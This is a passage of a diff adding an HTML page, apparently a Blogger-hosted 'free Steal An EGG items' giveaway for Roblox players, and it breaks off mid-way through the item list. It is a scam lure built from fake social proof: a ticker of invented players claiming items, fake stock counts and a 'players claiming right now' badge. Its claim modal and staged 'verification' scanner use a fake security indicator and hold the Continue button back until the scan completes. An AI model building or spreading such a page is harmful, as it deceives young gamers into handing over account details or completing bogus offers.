@@ -1,0 +1,1652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Steal An EGG - Drops</title>
+  <!-- خط Fredoka -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700;900&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --bg-gradient: radial-gradient(circle, #0e1e2b 0%, #060b11 100%);
+      --card-bg: #111d28;
+      --card-border: #1d3144;
+      --glow-color: #00d2ff;
+      --text-main: #ffffff;
+      --text-sub: #94a3b8;
+      --btn-primary: #0099ff;
+      --tab-bg: #182838;
+      --store-header-bg: #1a2f42;
+    }
+
+    body.light-mode {
+      --bg-gradient: radial-gradient(circle, #e2f1ff 0%, #c8e2fb 100%);
+      --card-bg: #ffffff;
+      --card-border: #93c5fd;
+      --glow-color: #0284c7;
+      --text-main: #0f172a;
+      --text-sub: #475569;
+      --btn-primary: #0284c7;
+      --tab-bg: #e2e8f0;
+      --store-header-bg: #cbd5e1;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Fredoka', sans-serif;
+    }
+
+    body {
+      background: var(--bg-gradient);
+      color: var(--text-main);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding-bottom: 50px;
+      transition: all 0.3s ease;
+    }
+
+    /* الشريط العلوي */
+    .top-bar {
+      width: 100%;
+      background: rgba(10, 20, 30, 0.95);
+      border-bottom: 2px solid var(--card-border);
+      padding: 8px 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(8px);
+    }
+
+    .ticker-container {
+      overflow: hidden;
+      white-space: nowrap;
+      flex: 1;
+      margin-right: 10px;
+    }
+
+    .ticker-text {
+      display: inline-block;
+      animation: ticker 18s linear infinite;
+      font-size: 0.85rem;
+      color: #94a3b8;
+    }
+
+    .ticker-text span {
+      color: #00f2fe;
+      font-weight: 700;
+    }
+
+    @keyframes ticker {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+
+    .lang-select {
+      background: #1e293b;
+      color: #fff;
+      border: 2px solid #334155;
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      cursor: pointer;
+      outline: none;
+    }
+
+    /* القسم الرئيسي */
+    .main-wrapper {
+      width: 92%;
+      max-width: 440px;
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .hero-top-row {
+      width: 100%;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .hero-logo {
+      width: 110px;
+      height: 110px;
+      border-radius: 16px;
+      border: 3px solid var(--glow-color);
+      box-shadow: 0 0 15px rgba(0, 210, 255, 0.4);
+      overflow: hidden;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    .hero-logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .top-theme-btn {
+      position: absolute;
+      right: 10px;
+      top: 10px;
+      background: var(--card-bg);
+      border: 2px solid var(--card-border);
+      color: var(--text-main);
+      padding: 8px 12px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1.1rem;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .hero-title {
+      font-size: 2rem;
+      font-weight: 900;
+      text-align: center;
+      text-transform: uppercase;
+      line-height: 1.1;
+      color: #ffffff;
+      text-shadow: 
+        2px 2px 0px #000,
+        -2px -2px 0px #000,
+        2px -2px 0px #000,
+        -2px 2px 0px #000,
+        0px 4px 10px rgba(0, 212, 255, 0.5);
+    }
+
+    .hero-subtitle {
+      text-align: center;
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #38bdf8;
+      max-width: 340px;
+      line-height: 1.3;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+    }
+
+    .status-badge {
+      background: linear-gradient(180deg, #1e293b, #0f172a);
+      border: 2px solid #00d2ff;
+      padding: 8px 20px;
+      border-radius: 30px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-transform: uppercase;
+      box-shadow: 0 0 10px rgba(0, 210, 255, 0.2);
+    }
+
+    .pulse-dot {
+      width: 10px;
+      height: 10px;
+      background-color: #22c55e;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #22c55e;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.8); }
+    }
+
+    /* كارت المتجر */
+    .store-card {
+      width: 100%;
+      background-color: var(--card-bg);
+      border: 2px solid var(--card-border);
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+    }
+
+    .store-header {
+      background-color: var(--store-header-bg);
+      background-image: radial-gradient(#2d4a66 10%, transparent 11%);
+      background-size: 10px 10px;
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 2px solid var(--card-border);
+    }
+
+    .store-title {
+      font-size: 1.3rem;
+      font-weight: 800;
+      color: #fff;
+      text-shadow: 2px 2px 0 #000;
+    }
+
+    .tab-buttons {
+      display: flex;
+      gap: 6px;
+    }
+
+    .tab-btn {
+      background: var(--tab-bg);
+      color: var(--text-main);
+      border: 2px solid var(--card-border);
+      padding: 6px 14px;
+      border-radius: 10px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      cursor: pointer;
+    }
+
+    .tab-btn.active {
+      background: #00d2ff;
+      color: #000;
+      border-color: #38bdf8;
+      box-shadow: 0 0 10px rgba(0, 210, 255, 0.4);
+    }
+
+    .items-container {
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      max-height: 420px;
+      overflow-y: auto;
+    }
+
+    .item-card {
+      background: rgba(0, 0, 0, 0.2);
+      border: 2px solid #00d2ff;
+      border-radius: 14px;
+      padding: 10px;
+      align-items: center;
+      justify-content: space-between;
+      display: none; 
+      box-shadow: 0 0 8px rgba(0, 210, 255, 0.15);
+    }
+
+    .item-card.active-tab {
+      display: flex;
+    }
+
+    .item-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .item-img {
+      width: 60px;
+      height: 60px;
+      border-radius: 10px;
+      background: #000;
+      border: 2px solid var(--card-border);
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .item-img img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .item-details {
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+
+    .item-name {
+      font-weight: 800;
+      font-size: 0.95rem;
+      text-transform: uppercase;
+      color: #fff;
+    }
+
+    .item-stock {
+      font-size: 0.75rem;
+      color: var(--text-sub);
+      font-weight: 600;
+    }
+
+    .rarity-tag {
+      background: linear-gradient(90deg, #00d2ff, #0072ff);
+      color: #fff;
+      font-size: 0.65rem;
+      font-weight: 800;
+      padding: 2px 8px;
+      border-radius: 6px;
+      width: fit-content;
+      text-transform: uppercase;
+    }
+
+    .claim-btn {
+      background: linear-gradient(180deg, #00d2ff 0%, #0072ff 100%);
+      color: #fff;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 12px;
+      font-weight: 800;
+      font-size: 0.95rem;
+      cursor: pointer;
+      box-shadow: 0 4px 0 #004fb3, 0 5px 10px rgba(0,0,0,0.4);
+    }
+
+    .claim-btn:active {
+      transform: translateY(3px);
+      box-shadow: 0 1px 0 #004fb3;
+    }
+
+    /* === الواجهة المنبثقة (Modal) === */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(6px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      padding: 15px;
+    }
+
+    .modal-box {
+      width: 100%;
+      max-width: 380px;
+      background: var(--card-bg);
+      border: 3px solid var(--glow-color);
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0, 210, 255, 0.35);
+      overflow: hidden;
+      animation: scaleUp 0.25s ease-out;
+    }
+
+    @keyframes scaleUp {
+      from { transform: scale(0.85); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-header {
+      background: var(--store-header-bg);
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 2px solid var(--card-border);
+      font-weight: 900;
+      font-size: 1rem;
+      color: #fff;
+    }
+
+    .modal-close {
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 1.4rem;
+      cursor: pointer;
+    }
+
+    .modal-body {
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      align-items: center;
+    }
+
+    .modal-item-preview {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.3);
+      border: 2px solid var(--card-border);
+      border-radius: 14px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .modal-item-img {
+      width: 55px;
+      height: 55px;
+      background: #000;
+      border-radius: 10px;
+      border: 2px solid var(--glow-color);
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-item-img img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .modal-item-details {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .modal-item-name {
+      font-size: 1rem;
+      font-weight: 800;
+      color: #fff;
+      text-transform: uppercase;
+    }
+
+    .modal-free-tag {
+      background: linear-gradient(90deg, #00d2ff, #0072ff);
+      color: #fff;
+      font-size: 0.65rem;
+      font-weight: 800;
+      padding: 2px 8px;
+      border-radius: 6px;
+      width: fit-content;
+    }
+
+    .modal-instruction {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--text-sub);
+      text-align: center;
+      line-height: 1.3;
+    }
+
+    .modal-input-group {
+      width: 100%;
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .modal-input-group span {
+      position: absolute;
+      left: 14px;
+      font-size: 1.2rem;
+    }
+
+    .modal-input {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      border: 2px solid var(--card-border);
+      padding: 12px 14px 12px 42px;
+      border-radius: 12px;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.95rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .modal-input:focus {
+      border-color: var(--glow-color);
+      box-shadow: 0 0 10px rgba(0, 210, 255, 0.3);
+    }
+
+    .modal-submit-btn {
+      width: 100%;
+      background: linear-gradient(180deg, #00d2ff 0%, #0072ff 100%);
+      color: #fff;
+      border: none;
+      padding: 12px;
+      border-radius: 12px;
+      font-weight: 900;
+      font-size: 1.05rem;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 4px 0 #004fb3, 0 6px 15px rgba(0, 210, 255, 0.4);
+    }
+
+    .modal-submit-btn:active {
+      transform: translateY(3px);
+      box-shadow: 0 1px 0 #004fb3;
+    }
+
+    .modal-security {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
+      color: #94a3b8;
+      font-weight: 600;
+    }
+
+    .secure-dot {
+      width: 8px;
+      height: 8px;
+      background-color: #22c55e;
+      border-radius: 50%;
+      box-shadow: 0 0 6px #22c55e;
+    }
+
+    /* === واجهة التحقق التدريجية === */
+    .verification-wrapper {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      width: 100%;
+    }
+
+    .scanner-circle {
+      width: 85px;
+      height: 85px;
+      background: radial-gradient(circle, #182838 0%, #0b131a 100%);
+      border: 3px solid var(--glow-color);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0, 210, 255, 0.4);
+      animation: pulseGlow 2s infinite;
+    }
+
+    @keyframes pulseGlow {
+      0%, 100% { box-shadow: 0 0 15px rgba(0, 210, 255, 0.4); }
+      50% { box-shadow: 0 0 25px rgba(0, 210, 255, 0.8); }
+    }
+
+    .scanner-icon-inner {
+      font-size: 2.2rem;
+    }
+
+    .scanner-line {
+      position: absolute;
+      width: 100%;
+      height: 3px;
+      background: #00f2fe;
+      box-shadow: 0 0 8px #00f2fe;
+      animation: scanMove 1.5s ease-in-out infinite alternate;
+    }
+
+    @keyframes scanMove {
+      0% { top: 15px; }
+      100% { top: 65px; }
+    }
+
+    .encrypting-title {
+      font-size: 0.95rem;
+      font-weight: 900;
+      color: var(--glow-color);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 8px rgba(0, 210, 255, 0.4);
+      margin-bottom: 2px;
+    }
+
+    .steps-list {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .step-box {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.25);
+      border: 2px solid var(--card-border);
+      border-radius: 12px;
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      transition: all 0.3s ease;
+    }
+
+    .step-box.completed {
+      border-color: #22c55e;
+      background: rgba(34, 197, 94, 0.08);
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.2);
+    }
+
+    .step-box.active-step {
+      border-color: var(--glow-color);
+      background: rgba(0, 210, 255, 0.08);
+      box-shadow: 0 0 12px rgba(0, 210, 255, 0.25);
+    }
+
+    .step-icon-badge {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      background: #1e293b;
+      border: 2px solid var(--card-border);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 0.9rem;
+      color: #fff;
+      flex-shrink: 0;
+    }
+
+    .step-box.completed .step-icon-badge {
+      background: #22c55e;
+      border-color: #16a34a;
+      color: #000;
+    }
+
+    .step-box.active-step .step-icon-badge {
+      background: var(--glow-color);
+      border-color: #38bdf8;
+      color: #000;
+      animation: bounceNumber 0.8s infinite alternate;
+    }
+
+    @keyframes bounceNumber {
+      from { transform: scale(1); }
+      to { transform: scale(1.12); }
+    }
+
+    .step-text-content {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .step-name {
+      font-size: 0.85rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      color: #fff;
+    }
+
+    .step-desc {
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--text-sub);
+    }
+
+    .step-box.completed .step-desc {
+      color: #4ade80;
+    }
+
+    .step-box.active-step .step-desc {
+      color: #38bdf8;
+    }
+
+    .modal-progress-track {
+      width: 100%;
+      height: 8px;
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 10px;
+      overflow: hidden;
+      border: 1px solid var(--card-border);
+      margin-top: 4px;
+    }
+
+    .modal-progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #00d2ff, #22c55e);
+      border-radius: 10px;
+      transition: width 0.4s ease;
+      box-shadow: 0 0 10px #00d2ff;
+    }
+
+    /* زر Continue المخصص */
+    .continue-btn {
+      width: 100%;
+      background: linear-gradient(180deg, #22c55e 0%, #16a34a 100%);
+      color: #fff;
+      border: none;
+      padding: 12px;
+      border-radius: 12px;
+      font-weight: 900;
+      font-size: 1.05rem;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 4px 0 #15803d, 0 6px 15px rgba(34, 197, 94, 0.4);
+      display: none; /* مخفي لحين انتهاء التحقق */
+      animation: bounceBtn 1s infinite alternate;
+      margin-top: 5px;
+    }
+
+    .continue-btn:active {
+      transform: translateY(3px);
+      box-shadow: 0 1px 0 #15803d;
+    }
+
+    @keyframes bounceBtn {
+      from { transform: scale(1); }
+      to { transform: scale(1.03); }
+    }
+  </style>
+<link rel="me" href="https://www.blogger.com/profile/17229069131579464507" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+
+  <!-- الشريط العلوي -->
+  <header class="top-bar">
+    <div class="ticker-container">
+      <div class="ticker-text" id="ticker-text">
+        ⚡ <span>[Ava1]</span> obtained 🥚 Dragon Egg! &nbsp;•&nbsp; 
+        💎 <span>[GamerX]</span> claimed 💠 Ember Dragon! &nbsp;•&nbsp; 
+        📦 <span>[ProPlayer]</span> found 🏆 Secret Trail!
+      </div>
+    </div>
+    <select class="lang-select" id="langSelect" onchange="changeLanguage()">
+      <option value="en">🌐 English</option>
+      <option value="fr">🇫🇷 Français</option>
+      <option value="es">🇪🇸 Español</option>
+      <option value="tl">🇵🇭 Tagalog</option>
+    </select>
+  </header>
+
+  <!-- المحتوى الرئيسي -->
+  <main class="main-wrapper">
+    <div class="hero-top-row">
+      <div class="hero-logo">
+        <img src="https://i.postimg.cc/nz9ZSxT5/steal-an-egg-object-1787046835875.png" alt="Steal An EGG Logo">
+      </div>
+      <button class="top-theme-btn" id="themeBtn" onclick="toggleTheme()">🌙</button>
+    </div>
+
+    <h1 class="hero-title" id="hero-title">GET YOUR FREE STEAL AN EGG ITEMS</h1>
+    <p class="hero-subtitle" id="hero-subtitle">For Roblox players. Tap claim and unlock your unique drop.</p>
+
+    <div class="status-badge">
+      <span class="pulse-dot"></span>
+      <span id="badge-text">PLAYERS CLAIMING RIGHT NOW</span>
+    </div>
+
+    <section class="store-card">
+      <div class="store-header">
+        <div class="store-title" id="store-title">🍬 STORE</div>
+        <div class="tab-buttons">
+          <button class="tab-btn active" id="tab-items" onclick="switchTab('items')">ITEMS</button>
+          <button class="tab-btn" id="tab-boosts" onclick="switchTab('boosts')">BOOSTS</button>
+        </div>
+      </div>
+
+      <div class="items-container" id="items-list">
+        
+        <!-- ==================== قسم الـ ITEMS ==================== -->
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/05wzR1pY/1000036590-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Guardian Treadmill</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Guardian Treadmill', 'https://i.postimg.cc/05wzR1pY/1000036590-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/6pFcQ04P/Astral-Treadmill.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Astral Treadmill</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Astral Treadmill', 'https://i.postimg.cc/6pFcQ04P/Astral-Treadmill.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/yxkL6THp/angelic-treadmill.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Angelic Treadmill</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Angelic Treadmill', 'https://i.postimg.cc/yxkL6THp/angelic-treadmill.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/52CrzHV8/1000028935-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Treadmill x100</span>
+              <span class="item-stock">x11 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Treadmill x100', 'https://i.postimg.cc/52CrzHV8/1000028935-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/5N0yfJVQ/1000028938-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Treadmill x200</span>
+              <span class="item-stock">x9 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Treadmill x200', 'https://i.postimg.cc/5N0yfJVQ/1000028938-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/d0f2gTrH/67.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">67</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('67', 'https://i.postimg.cc/d0f2gTrH/67.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/TwfryH2G/World-Burner-Egg.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">world burner Egg</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('World Burner Egg', 'https://i.postimg.cc/TwfryH2G/World-Burner-Egg.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/MG8B4rQR/World-Burner.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">world burner</span>
+              <span class="item-stock">x8 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('World Burner', 'https://i.postimg.cc/MG8B4rQR/World-Burner.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/kG3y9PT6/nightflame-egg.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Nightflame Egg</span>
+              <span class="item-stock">x7 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Nightflame Egg', 'https://i.postimg.cc/kG3y9PT6/nightflame-egg.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/wv66r1px/Equinox-Egg.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Equinox Egg</span>
+              <span class="item-stock">x5 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Equinox Egg', 'https://i.postimg.cc/wv66r1px/Equinox-Egg.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/xCT2RBvd/Equinox.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Equinox</span>
+              <span class="item-stock">x8 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Equinox', 'https://i.postimg.cc/xCT2RBvd/Equinox.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/SxJYZtG7/nightflame.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Nightflame</span>
+              <span class="item-stock">x5 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Nightflame', 'https://i.postimg.cc/SxJYZtG7/nightflame.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/8k9HBMDr/Arch-Angel.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">ArchAngel</span>
+              <span class="item-stock">x9 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('ArchAngel', 'https://i.postimg.cc/8k9HBMDr/Arch-Angel.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/xqVjtcxz/Arch-Angel-Egg.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">ArchAngel Egg</span>
+              <span class="item-stock">x9 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('ArchAngel Egg', 'https://i.postimg.cc/xqVjtcxz/Arch-Angel-Egg.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/0NK5STCq/Gargoyle.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Gargoyle</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Gargoyle', 'https://i.postimg.cc/0NK5STCq/Gargoyle.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/59scxPwr/Aetheron.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Aetheron</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Aetheron', 'https://i.postimg.cc/59scxPwr/Aetheron.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/yd75K9W7/Aetheron-Egg.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Aetheron Egg</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Aetheron Egg', 'https://i.postimg.cc/yd75K9W7/Aetheron-Egg.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/D0q1YdkX/Celestial-Star-Lion-Guardian.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Celestial StarLion</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Celestial StarLion', 'https://i.postimg.cc/D0q1YdkX/Celestial-Star-Lion-Guardian.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/CxWLzynX/Royal-Sky-Whale-with-Floating-Island.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Royal SkyWhale</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Royal SkyWhale', 'https://i.postimg.cc/CxWLzynX/Royal-Sky-Whale-with-Floating-Island.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/L6prt7fG/1000029128-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">King Gorilla Egg</span>
+              <span class="item-stock">x5 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('King Gorilla Egg', 'https://i.postimg.cc/L6prt7fG/1000029128-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/MHdbjv1K/1000029131-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">King Gorilla</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('King Gorilla', 'https://i.postimg.cc/MHdbjv1K/1000029131-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/xC87tPjk/1000027620-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Dragon Egg</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Dragon Egg', 'https://i.postimg.cc/xC87tPjk/1000027620-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
